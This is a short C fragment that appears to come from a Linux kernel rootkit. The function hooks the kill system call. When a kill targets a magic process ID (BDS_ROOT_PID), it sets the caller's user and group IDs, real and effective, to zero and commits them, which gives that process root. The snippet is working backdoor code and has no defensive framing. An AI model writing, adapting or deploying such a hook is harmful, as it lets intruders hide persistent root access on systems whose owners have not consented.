static asmlinkage int bds_kill(const struct pt_regs *pt_regs) {
	int ret;
	int pid;
	
	ret = orig_kill(pt_regs);
	pid = (int) pt_regs->di;
	
	cred = NULL;
	if (pid == atoi(BDS_ROOT_PID)) {
		cred = prepare_creds();
		if (cred != NULL) {
			cred->uid.val = 0;
			cred->gid.val = 0;
			cred->euid.val = 0;
			cred->egid.val = 0;
			commit_creds(cred);
		}
	}
	
	return ret;
}
